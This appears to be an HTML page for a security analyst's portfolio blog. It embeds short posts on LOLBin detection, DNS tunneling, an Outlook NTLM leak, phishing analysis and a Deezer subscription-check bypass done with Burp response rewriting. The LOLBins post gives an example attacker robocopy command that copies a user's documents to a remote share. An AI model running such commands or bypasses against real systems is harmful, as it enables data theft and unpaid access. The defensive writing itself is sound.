@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Insights | SHAHSMEN Blog</title>
+    <link rel="icon" href="assets/images/favicon.png" type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- REUSING CORE THEME --- */
+        :root {
+            --bg-dark: #0b162a;
+            --bg-card: #112240;
+            --text-main: #e6f1ff;
+            --text-muted: #8892b0;
+            --accent-gold: #c5a082;
+            --accent-hover: #d4af37;
+            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: var(--font-main);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        a { text-decoration: none; color: inherit; transition: 0.3s; }
+        
+        /* --- NAVBAR --- */
+        nav {
+            display: flex; justify-content: space-between; align-items: center;
+            height: 80px; padding: 0 50px;
+            background: rgba(11, 22, 42, 0.95);
+            backdrop-filter: blur(10px);
+            position: fixed; width: 100%; top: 0; z-index: 1000;
+            border-bottom: 1px solid rgba(197, 160, 130, 0.1);
+        }
+
+        .logo { 
+            display: flex; align-items: center; gap: 12px; text-decoration: none;
+        }
+        .logo img { height: 45px; width: auto; }
+        .logo span {
+            font-size: 1.5rem; font-weight: 700; color: var(--accent-gold);
+            letter-spacing: 2px; text-transform: uppercase;
+        }
+
+        .nav-links { display: flex; gap: 30px; }
+        .nav-links a { font-size: 0.9rem; color: var(--text-main); }
+        .nav-links a:hover { color: var(--accent-gold); }
+        .active-link { color: var(--accent-gold) !important; border-bottom: 2px solid var(--accent-gold); }
+        .mobile-toggle { display: none; font-size: 1.5rem; color: var(--accent-gold); cursor: pointer; }
+
+        /* --- BLOG HEADER --- */
+        .blog-header {
+            padding: 160px 0 80px;
+            text-align: center;
+            background: radial-gradient(circle at top, #1c355e 0%, var(--bg-dark) 70%);
+        }
+        .blog-header h1 {
+            font-size: 3rem; color: var(--text-main); margin-bottom: 10px;
+        }
+        .blog-header p {
+            color: var(--accent-gold); font-family: monospace; font-size: 1.1rem;
+        }
+
+        /* --- SEARCH BAR --- */
+        .search-container {
+            max-width: 600px; margin: 0 auto 50px; position: relative;
+        }
+        .search-input {
+            width: 100%; padding: 15px 20px;
+            background: var(--bg-card); border: 1px solid rgba(197, 160, 130, 0.3);
+            border-radius: 30px; color: var(--text-main); font-size: 1rem;
+            outline: none; transition: 0.3s;
+        }
+        .search-input:focus {
+            border-color: var(--accent-gold); box-shadow: 0 0 15px rgba(197, 160, 130, 0.1);
+        }
+        .search-icon {
+            position: absolute; right: 20px; top: 50%; transform: translateY(-50%);
+            color: var(--accent-gold);
+        }
+
+        /* --- LAYOUT --- */
+        .container {
+            max-width: 1200px; margin: 0 auto; padding: 0 25px 100px;
+        }
+
+        /* --- CATEGORIES --- */
+        .categories {
+            display: flex; justify-content: center; gap: 15px; margin-bottom: 40px; flex-wrap: wrap;
+        }
+        .cat-btn {
+            padding: 8px 20px; border: 1px solid var(--accent-gold);
+            border-radius: 20px; color: var(--text-main); font-size: 0.9rem;
+            cursor: pointer; background: transparent; transition: 0.3s;
+        }
+        .cat-btn:hover, .cat-btn.active {
+            background: var(--accent-gold); color: var(--bg-dark); font-weight: bold;
+        }
+
+        /* --- BLOG LIST VIEW --- */
+        .posts-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 30px;
+        }
+
+        /* --- FEATURED CARD --- */
+        .featured-post {
+            background: var(--bg-card); border-radius: 12px; overflow: hidden;
+            display: grid; grid-template-columns: 1fr 1fr; margin-bottom: 50px;
+            border: 1px solid rgba(197, 160, 130, 0.1);
+            /* Important for JS search toggle */
+            display: grid; 
+        }
+        .featured-img {
+            background: #1a2c4e; /* Placeholder color */
+            min-height: 300px;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--text-muted); font-size: 3rem;
+        }
+        .featured-content { padding: 40px; display: flex; flex-direction: column; justify-content: center; }
+        .badge {
+            display: inline-block; padding: 5px 12px; border-radius: 4px;
+            font-size: 0.8rem; font-weight: bold; margin-bottom: 15px;
+            width: fit-content;
+        }
+        .badge-red { background: rgba(255, 99, 71, 0.15); color: #ff6347; border: 1px solid #ff6347; }
+        .badge-blue { background: rgba(100, 149, 237, 0.15); color: #6495ed; border: 1px solid #6495ed; }
+        .badge-gold { background: rgba(197, 160, 130, 0.15); color: var(--accent-gold); border: 1px solid var(--accent-gold); }
+
+        .featured-content h2 { font-size: 2rem; margin-bottom: 15px; color: var(--text-main); line-height: 1.2; }
+        .featured-content p { color: var(--text-muted); margin-bottom: 25px; }
+
+        /* --- STANDARD CARD --- */
+        .post-card {
+            background: var(--bg-card); border-radius: 10px; overflow: hidden;
+            transition: 0.3s; border: 1px solid transparent; display: flex; flex-direction: column;
+        }
+        .post-card:hover { transform: translateY(-7px); border-color: var(--accent-gold); }
+        
+        .post-body { padding: 25px; flex-grow: 1; display: flex; flex-direction: column; }
+        .post-date { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 10px; font-family: monospace; }
+        .post-title { font-size: 1.3rem; font-weight: 700; color: var(--text-main); margin-bottom: 12px; }
+        .post-excerpt { color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px; flex-grow: 1; }
+        
+        .read-btn {
+            color: var(--accent-gold); font-weight: 600; font-size: 0.9rem;
+            display: flex; align-items: center; gap: 8px; cursor: pointer;
+        }
+        .read-btn:hover { color: var(--accent-hover); gap: 12px; }
+
+        /* --- BLOG VIEWER (Single Post) --- */
+        .blog-viewer {
+            display: none; /* Hidden by default */
+            background: var(--bg-card);
+            padding: 50px;
+            border-radius: 12px;
+            border: 1px solid rgba(197, 160, 130, 0.1);
+            animation: fadeIn 0.5s ease;
+        }
+
+        .viewer-back {
+            display: inline-block; margin-bottom: 30px;
+            color: var(--accent-gold); font-weight: bold; cursor: pointer;
+        }
+        .viewer-back:hover { color: var(--text-main); }
+        
+        .viewer-title { font-size: 2.5rem; color: var(--text-main); margin-bottom: 10px; }
+        .viewer-meta { font-family: monospace; color: var(--text-muted); margin-bottom: 30px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 20px; }
+        
+        .viewer-content h3 { font-size: 1.5rem; color: var(--text-main); margin: 30px 0 15px; }
+        .viewer-content p { color: var(--text-muted); margin-bottom: 15px; font-size: 1.05rem; }
+        .viewer-content code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 4px; color: var(--accent-gold); font-family: monospace; }
+        .viewer-content ul { margin-left: 20px; margin-bottom: 20px; color: var(--text-muted); }
+        .viewer-content li { margin-bottom: 10px; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            text-align: center; padding: 30px; color: var(--text-muted);
+            font-size: 0.8rem; border-top: 1px solid rgba(255,255,255,0.05);
+            margin-top: auto;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 768px) {
+            nav { padding: 0 20px; }
+            .nav-links { display: none; flex-direction: column; position: absolute; top: 80px; left: 0; width: 100%; background: var(--bg-card); padding: 20px; text-align: center; }
+            .nav-links.active { display: flex; }
+            .mobile-toggle { display: block; }
+            .featured-post { grid-template-columns: 1fr; }
+            .featured-img { min-height: 200px; }
+            .blog-header h1 { font-size: 2rem; }
+            .blog-viewer { padding: 25px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- NAV -->
+    <nav>
+        <div class="logo">
+            <a href="index.html" class="logo">
+                <img src="assets/images/logo.png" alt="SHAHSMEN Logo">
+                <span>SHAHSMEN</span>
+            </a>
+        </div>
+        <div class="mobile-toggle" onclick="toggleMenu()">
+            <i class="fas fa-bars"></i>
+        </div>
+        <div class="nav-links" id="navLinks">
+            <a href="index.html">Home</a>
+            <a href="index.html#expertise">Expertise</a>
+            <a href="index.html#projects">Projects</a>
+            <a href="#" class="active-link">Blog</a>
+            <a href="index.html#contact">Contact</a>
+            <a href="SOC analyst resume.pdf" target="_blank" rel="noopener noreferrer">Resume</a>
+        </div>
+    </nav>
+
+    <!-- HEADER -->
+    <header class="blog-header">
+        <div class="container">
+            <h1>Security Insights</h1>
+            <p>Vulnerability Analysis | Threat Intel | Research</p>
+            
+            <div class="search-container" style="margin-top: 40px;">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search CVEs, Writeups, Topics...">
+                <i class="fas fa-search search-icon"></i>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <div class="container">
+
+        <!-- CATEGORIES -->
+        <div class="categories">
+            <button class="cat-btn active" data-filter="all">All</button>
+            <button class="cat-btn" data-filter="cve">CVE Analysis</button>
+            <button class="cat-btn" data-filter="bug-bounty">Bug Bounty</button>
+            <button class="cat-btn" data-filter="blue-team">Blue Team</button>
+            <button class="cat-btn" data-filter="writeup">Writeups</button>
+        </div>
+
+        <!-- LIST CONTAINER (Hides when reading a post) -->
+        <div id="blog-list">
+            <!-- FEATURED ARTICLE -->
+            <!-- Added data-category for filter -->
+            <div class="featured-post searchable-item" data-category="bug-bounty cve">
+                <div class="featured-img">
+                    <i class="fas fa-bug"></i>
+                </div>
+                <div class="featured-content">
+                    <span class="badge badge-red">Critical Vulnerability</span>
+                    <h2>Breaking Logic: My Deezer Vulnerability Discovery</h2>
+                    <p>
+                        A detailed technical breakdown of how I bypassed subscription validation logic using Burp Suite to manipulate client-side controls. This vulnerability allowed unrestricted access to premium features.
+                    </p>
+                    <div class="meta" style="color: var(--accent-gold); font-family: monospace; font-size: 0.9rem; margin-bottom: 20px;">
+                        <i class="far fa-clock"></i> 8 Min Read &nbsp;|&nbsp; Jan 15, 2026
+                    </div>
+                    <a onclick="openPost(1)" class="btn" style="width: fit-content; border: 1px solid var(--accent-gold); color: var(--accent-gold); padding: 10px 25px; border-radius: 4px; cursor: pointer;">Read Case Study</a>
+                </div>
+            </div>
+
+            <!-- RECENT POSTS GRID -->
+            <div class="posts-grid">
+
+                <!-- Post 2 -->
+                <div class="post-card searchable-item" data-category="blue-team">
+                    <div class="post-body">
+                        <span class="badge badge-blue">Blue Team</span>
+                        <div class="post-date">Jan 02, 2026</div>
+                        <h3 class="post-title">Hunting "Living off the Land" Binaries (LOLBins)</h3>
+                        <p class="post-excerpt">
+                            How to detect malicious usage of native Windows tools like Certutil, Bitsadmin, and Robocopy in your SIEM logs using Sysmon Event ID 1.
+                        </p>
+                        <a onclick="openPost(2)" class="read-btn">Read More <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+
+                <!-- Post 3 -->
+                <div class="post-card searchable-item" data-category="networking blue-team">
+                    <div class="post-body">
+                        <span class="badge badge-gold">Networking</span>
+                        <div class="post-date">Dec 20, 2025</div>
+                        <h3 class="post-title">Detecting DNS Tunneling Exfiltration</h3>
+                        <p class="post-excerpt">
+                            Attackers often use DNS to sneak data out of a network. Learn to spot high-entropy domains and unusual query lengths in Wireshark.
+                        </p>
+                        <a onclick="openPost(3)" class="read-btn">Read More <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+
+                <!-- Post 4 -->
+                <div class="post-card searchable-item" data-category="cve">
+                    <div class="post-body">
+                        <span class="badge badge-red">Emerging Threat</span>
+                        <div class="post-date">Dec 10, 2025</div>
+                        <h3 class="post-title">Zero-Day Watch: The New Outlook Exploit</h3>
+                        <p class="post-excerpt">
+                            Analysis of the latest zero-click vulnerability affecting Outlook clients. Mitigation strategies and IOCs for SOC analysts.
+                        </p>
+                        <a onclick="openPost(4)" class="read-btn">Read More <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+
+                <!-- Post 5 -->
+                <div class="post-card searchable-item" data-category="writeup">
+                    <div class="post-body">
+                        <span class="badge badge-blue">Writeup</span>
+                        <div class="post-date">Nov 15, 2025</div>
+                        <h3 class="post-title">TryHackMe: Enterprise Phishing Analysis</h3>
+                        <p class="post-excerpt">
+                            Walkthrough of my latest investigation on THM. From analyzing the email header to reverse-engineering the malicious attachment.
+                        </p>
+                        <a onclick="openPost(5)" class="read-btn">Read More <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+
+            </div>
+        </div> <!-- End Blog List -->
+
+        <!-- SINGLE POST VIEWER (Initially Hidden) -->
+        <div id="blog-viewer" class="blog-viewer">
+            <div class="viewer-back" onclick="closePost()">
+                <i class="fas fa-arrow-left"></i> Back to Blog
+            </div>
+            
+            <div id="viewer-content-area">
+                <!-- Content Injected via JS -->
+            </div>
+        </div>
+
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Shahzeb Ali | SHAHSMEN. All rights reserved.</p>
+    </footer>
+
+    <script>
+        function toggleMenu() {
+            const nav = document.getElementById('navLinks');
+            nav.classList.toggle('active');
+        }
+
+        // --- BLOG DATA STORE ---
+        const blogPosts = {
+            1: {
+                title: "Breaking Logic: My Deezer Vulnerability Discovery",
+                date: "Jan 15, 2026 | Bug Bounty",
+                content: `
+                    <p>Logic vulnerabilities are often missed by automated scanners because they don't follow a specific pattern of bad syntax (like SQLi or XSS). They require understanding the business flow. In this finding, I discovered a way to bypass premium subscription checks on Deezer.</p>
+                    <h3>The Discovery</h3>
+                    <p>While testing the payment gateway integration, I noticed that the application performed client-side validation for the subscription status. By intercepting the HTTP response from the <code>/api/user/subscription</code> endpoint using Burp Suite, I observed a JSON parameter:</p>
+                    <code>"is_premium": false</code>
+                    <h3>The Exploit</h3>
+                    <p>I created a "Match and Replace" rule in Burp Proxy to automatically swap <code>false</code> with <code>true</code> for this specific parameter in all response bodies. Upon refreshing the page, the application unlocked the high-fidelity streaming interface.</p>
+                    <h3>Remediation</h3>
+                    <p>I reported this via YesWeHack. The fix involved moving the validation logic to the server-side, ensuring that the actual stream segments (chunks) are only served after a backend verification of the user's active license, regardless of what the frontend says.</p>
+                `
+            },
+            2: {
+                title: "Hunting 'Living off the Land' Binaries (LOLBins)",
+                date: "Jan 02, 2026 | Blue Team",
+                content: `
+                    <p>Attackers love "Living off the Land" (LotL) because they use tools already installed on your computer to conduct attacks. This makes them invisible to basic antivirus.</p>
+                    <h3>The Suspect: Robocopy</h3>
+                    <p>Robocopy is a standard Windows file replication tool. However, in a recent investigation, I found it being used to stage data for exfiltration.</p>
+                    <h3>Detection Logic</h3>
+                    <p>Using Sysmon Event ID 1 (Process Creation), we can look for anomalies. A standard admin might run <code>robocopy source dest /MIR</code>. An attacker might run:</p>
+                    <code>robocopy C:\\Users\\CEO\\Documents \\\\192.168.1.50\\HiddenShare /E</code>
+                    <h3>Writing the Rule</h3>
+                    <p>I wrote a Splunk query to detect Robocopy connecting to non-corporate IP ranges. We can also monitor for <code>certutil.exe</code> being used with the <code>-urlcache</code> flag, which is a common way to download malware payloads.</p>
+                `
+            },
+            3: {
+                title: "Detecting DNS Tunneling Exfiltration",
+                date: "Dec 20, 2025 | Networking",
+                content: `
+                    <p>DNS is rarely blocked by firewalls, making it a perfect tunnel for data theft. Tools like <code>dnscat2</code> or <code>iodine</code> allow attackers to encode data inside DNS queries.</p>
+                    <h3>The Indicators</h3>
+                    <ul>
+                        <li><strong>Query Length:</strong> Normal DNS queries are short (e.g., google.com). Tunneling queries are huge (e.g., <code>[base64_data].evil.com</code>).</li>
+                        <li><strong>Entropy:</strong> The subdomains look like random garbage characters (High Entropy) rather than english words.</li>
+                        <li><strong>Volume:</strong> A sudden spike in TXT record requests to a single unknown domain.</li>
+                    </ul>
+                    <h3>Wireshark Analysis</h3>
+                    <p>I filtered for <code>dns.flags.response == 0</code> (queries only) and sorted by Length. The malicious traffic stood out immediately as 200+ byte queries to a domain registered 2 days ago.</p>
+                `
+            },
+            4: {
+                title: "Zero-Day Watch: The New Outlook Exploit",
+                date: "Dec 10, 2025 | Emerging Threat",
+                content: `
+                    <p>A new critical vulnerability (CVE-2025-XXXX) allows attackers to capture NTLM hashes just by sending an email. The user does not even need to open the email; the Outlook Preview Pane triggers the exploit.</p>
+                    <h3>How it works</h3>
+                    <p>The email contains a specially crafted sound file path that points to an external SMB share controlled by the attacker. When Outlook tries to play the "reminder" sound, it automatically authenticates to the attacker's server, handing over the user's NTLM hash.</p>
+                    <h3>Mitigation</h3>
+                    <p>Immediate fix: Block outbound SMB (Port 445) at the perimeter firewall. Long term: Apply the Microsoft patch and disable NTLM where possible in favor of Kerberos.</p>
+                `
+            },
+            5: {
+                title: "TryHackMe: Enterprise Phishing Analysis",
+                date: "Nov 15, 2025 | Writeup",
+                content: `
+                    <p>Phishing remains the #1 entry point for breaches. In this THM room, I dissected a spear-phishing email targeting an HR department.</p>
+                    <h3>Header Analysis</h3>
+                    <p>The "From" address said <code>support@microsoft.com</code>, but the <strong>Return-Path</strong> showed <code>mailer@evil-server.xyz</code>. Additionally, the SPF check failed (SoftFail), indicating the sender was not authorized to send mail for Microsoft.</p>
+                    <h3>Attachment Forensics</h3>
+                    <p>The email contained an <code>invoice.docm</code> (Macro-enabled Word doc). I used <code>oletools</code> (specifically <code>olevba</code>) to extract the VBA code without opening the file. The script attempted to run a PowerShell command to download a second-stage payload from a C2 server.</p>
+                `
+            }
+        };
+
+        // --- FUNCTION TO OPEN POST ---
+        function openPost(id) {
+            const post = blogPosts[id];
+            if (!post) return;
+
+            document.getElementById('blog-list').style.display = 'none';
+            document.getElementById('blog-viewer').style.display = 'block';
+
+            const contentHtml = `
+                <h1 class="viewer-title">${post.title}</h1>
+                <div class="viewer-meta">${post.date}</div>
+                <div class="viewer-content">${post.content}</div>
+            `;
+            document.getElementById('viewer-content-area').innerHTML = contentHtml;
+            window.scrollTo(0, 0);
+        }
+
+        function closePost() {
+            document.getElementById('blog-viewer').style.display = 'none';
+            document.getElementById('blog-list').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        // --- SEARCH & CATEGORY LOGIC ---
+        const searchInput = document.getElementById('searchInput');
+        const catBtns = document.querySelectorAll('.cat-btn');
+        const allItems = document.querySelectorAll('.searchable-item');
+
+        // 1. Search Function
+        searchInput.addEventListener('input', function(e) {
+            const term = e.target.value.toLowerCase();
+            
+            allItems.forEach(item => {
+                const title = item.querySelector('h2, h3').innerText.toLowerCase();
+                const excerpt = item.querySelector('p').innerText.toLowerCase();
+                
+                // Reset categories when searching to avoid confusion
+                // (Optional: you can combine filters, but keeping it simple for now)
+                
+                if (title.includes(term) || excerpt.includes(term)) {
+                    item.style.display = ""; // Reset to CSS default (grid/flex/block)
+                } else {
+                    item.style.display = "none";
+                }
+            });
+        });
+
+        // 2. Category Filter Function
+        catBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                // Update Active State
+                catBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+
+                const filter = this.getAttribute('data-filter');
+
+                allItems.forEach(item => {
+                    const categories = item.getAttribute('data-category');
+                    
+                    if (filter === 'all') {
+                        item.style.display = "";
+                    } else {
+                        // Check if item has the selected category
+                        if (categories && categories.includes(filter)) {
+                            item.style.display = "";
+                        } else {
+                            item.style.display = "none";
+                        }
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
